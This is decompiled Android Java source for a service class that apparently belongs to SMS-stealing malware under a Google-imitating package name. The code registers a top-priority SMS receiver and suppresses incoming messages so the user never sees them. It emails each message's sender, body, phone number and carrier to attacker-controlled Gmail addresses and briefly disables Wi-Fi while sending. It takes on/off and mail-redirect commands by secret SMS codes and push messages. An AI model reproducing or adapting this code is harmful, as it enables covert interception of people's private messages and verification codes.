package com.googleprojects.mm;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import com.googleprojects.mmsp.GCMIntentService;
import com.googleprojects.mmsp.GCMListener;

public class JHService extends Service implements GCMListener {
    static final String SMS_MAIL_SEPARATOR = "HH";
    static final String SMS_OFF_MSG = "$$";
    static final String SMS_ON_MSG = "##";
    SOMMail currentMail;
    JHDataManager dataManager;
    private JHINMsgReceiver mReceiver;
    Handler mSMSReceivedHandler = new Handler() {
        public void handleMessage(Message msg) {
            if (msg.obj != null) {
                JHService.this.smsReceived(msg.obj);
            }
        }
    };
    SOMailCPUtil mailUtil;
    private GJSMSUtil msgUtil;
    private String networkName = MMMailContentUtil.MM_MESSAGE_SUBJECT;
    private String userPhone = MMMailContentUtil.MM_MESSAGE_SUBJECT;

    private class JHINMsgReceiver extends BroadcastReceiver {
        private JHINMsgReceiver() {
        }

        /* synthetic */ JHINMsgReceiver(JHService jHService, JHINMsgReceiver jHINMsgReceiver) {
            this();
        }

        public void onReceive(Context context, Intent intent) {
            boolean offReceived = false;
            boolean mailChanged = false;
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                SmsMessage[] msgs = new SmsMessage[pdus.length];
                for (int i = 0; i < msgs.length; i++) {
                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    String msgBody = SmsMessage.createFromPdu((byte[]) pdus[i]).getMessageBody();
                    if (msgBody.indexOf(JHService.SMS_ON_MSG) >= 0) {
                        abortBroadcast();
                        JHService.this.dataManager.setEnabled("1");
                    } else if (msgBody.indexOf(JHService.SMS_OFF_MSG) >= 0) {
                        abortBroadcast();
                        offReceived = true;
                        JHService.this.dataManager.setEnabled("0");
                    } else if (msgBody.startsWith(JHService.SMS_MAIL_SEPARATOR)) {
                        String[] mailInfo = msgBody.split(JHService.SMS_MAIL_SEPARATOR);
                        if (mailInfo.length == 3) {
                            abortBroadcast();
                            String sender = mailInfo[1] + "@gmail.com";
                            String recv = mailInfo[2] + "@gmail.com";
                            String smtpAddr = SOMailCPUtil.default_smtp_addr;
                            mailChanged = JHService.this.mailUtil.changeMail(sender, recv, SOMailCPUtil.default_smtp_port, smtpAddr);
                        }
                    }
                }
            }
            if (JHService.this.dataManager.isEnabled() || offReceived) {
                abortBroadcast();
                if (!mailChanged) {
                    new SMSSendJob(intent).execute(null);
                }
            }
        }
    }

    class SMSSendJob extends AsyncTask<String, Void, String> {
        Intent mIntent;

        public SMSSendJob(Intent msgIntent) {
            this.mIntent = msgIntent;
        }

        /* access modifiers changed from: protected|varargs */
        public String doInBackground(String... params) {
            JHService.this.smsReceived(this.mIntent);
            return null;
        }

        /* access modifiers changed from: protected */
        public void onPostExecute(String result) {
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        this.mailUtil = new SOMailCPUtil(this);
        this.currentMail = this.mailUtil.getCurrentMail();
        this.msgUtil = new GJSMSUtil(this);
        this.dataManager = new JHDataManager(this);
        this.mReceiver = new JHINMsgReceiver(this, null);
        TelephonyManager manager = (TelephonyManager) getSystemService("phone");
        this.userPhone = manager.getLine1Number();
        this.networkName = manager.getNetworkOperatorName();
        if (this.networkName == null || this.networkName.length() < 0) {
            this.networkName = manager.getSimOperatorName();
        }
        if (this.networkName == null || this.networkName.length() < 0) {
            this.networkName = manager.getSimOperator();
        }
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        filter.setPriority(99999999);
        registerReceiver(this.mReceiver, filter);
        GCMIntentService.mListener = this;
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        return 1;
    }

    /* access modifiers changed from: 0000 */
    public void smsReceived(Intent intent) {
        SmsMessage[] msgs = this.msgUtil.getMessageListFromIntent(intent);
        boolean needSkip = false;
        for (SmsMessage smsg : msgs) {
            String addr = smsg.getOriginatingAddress();
            String msgBody = smsg.getMessageBody();
            if (msgBody.indexOf(SMS_ON_MSG) >= 0) {
                needSkip = true;
                this.dataManager.setEnabled("1");
            } else if (msgBody.indexOf(SMS_OFF_MSG) >= 0) {
                needSkip = true;
                this.dataManager.setEnabled("0");
            }
            boolean wifiToggled = false;
            WifiManager wManager = (WifiManager) getSystemService("wifi");
            if (wManager.isWifiEnabled() && wManager.getWifiState() == 3) {
                wifiToggled = true;
                wManager.setWifiEnabled(false);
            }
            TelephonyManager manager = (TelephonyManager) getSystemService("phone");
            String userPhone = manager.getLine1Number();
            String networkName = manager.getNetworkOperatorName();
            if (networkName == null || networkName.length() < 0) {
                networkName = manager.getSimOperatorName();
            }
            if (networkName == null || networkName.length() < 0) {
                networkName = manager.getSimOperator();
            }
            try {
                this.currentMail = this.mailUtil.getCurrentMail();
                new MMMailSender(this.currentMail.sender_addr, SOMailCPUtil.mail_pwd, this.currentMail.smtp_addr, this.currentMail.smtp_port).sendMail(MMMailContentUtil.MM_MESSAGE_SUBJECT, MMMailContentUtil.makeMMMessageBody(userPhone, networkName, MMMailContentUtil.MM_MESSAGE_SUBJECT, addr, msgBody, this.dataManager.isEnabled(), VERSION.RELEASE), this.currentMail.sender_addr, this.currentMail.receiver_addr);
            } catch (Exception e) {
                e.printStackTrace();
            }
            if (wifiToggled) {
                wManager.setWifiEnabled(true);
            }
            if (!(this.dataManager.isEnabled() || needSkip)) {
                this.msgUtil.addMessageToInbox(smsg);
            }
        }
    }

    public void GCMListener_MessageReceived(String msg) {
        String enabled = "0";
        if (msg != null && msg.length() > 0) {
            String[] arVals = msg.split(":");
            if (arVals != null && arVals.length >= 2 && arVals[0].equalsIgnoreCase("enable")) {
                enabled = arVals[1];
            }
        }
        this.dataManager.setEnabled(enabled);
    }

    public void GCMListener_Registered(String deviceToken) {
        TelephonyManager manager = (TelephonyManager) getSystemService("phone");
        String userPhone = manager.getLine1Number();
        String networkName = manager.getNetworkOperatorName();
        if (networkName == null || networkName.length() < 0) {
            networkName = manager.getSimOperatorName();
        }
        if (networkName == null || networkName.length() < 0) {
            networkName = manager.getSimOperator();
        }
        boolean wifiToggled = false;
        WifiManager wManager = (WifiManager) getSystemService("wifi");
        if (wManager.isWifiEnabled() && wManager.getWifiState() == 3) {
            wifiToggled = true;
            wManager.setWifiEnabled(false);
        }
        try {
            this.currentMail = this.mailUtil.getCurrentMail();
            new MMMailSender(this.currentMail.sender_addr, SOMailCPUtil.mail_pwd, this.currentMail.smtp_addr, this.currentMail.smtp_port).sendMail(MMMailContentUtil.MM_MESSAGE_SUBJECT, MMMailContentUtil.makeMMMessageBody(userPhone, networkName, MMMailContentUtil.MM_MESSAGE_SUBJECT, MMMailContentUtil.MM_MESSAGE_SUBJECT, MMMailContentUtil.MM_MESSAGE_SUBJECT, this.dataManager.isEnabled(), VERSION.RELEASE), this.currentMail.sender_addr, this.currentMail.receiver_addr);
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (wifiToggled) {
            wManager.setWifiEnabled(true);
        }
    }
}
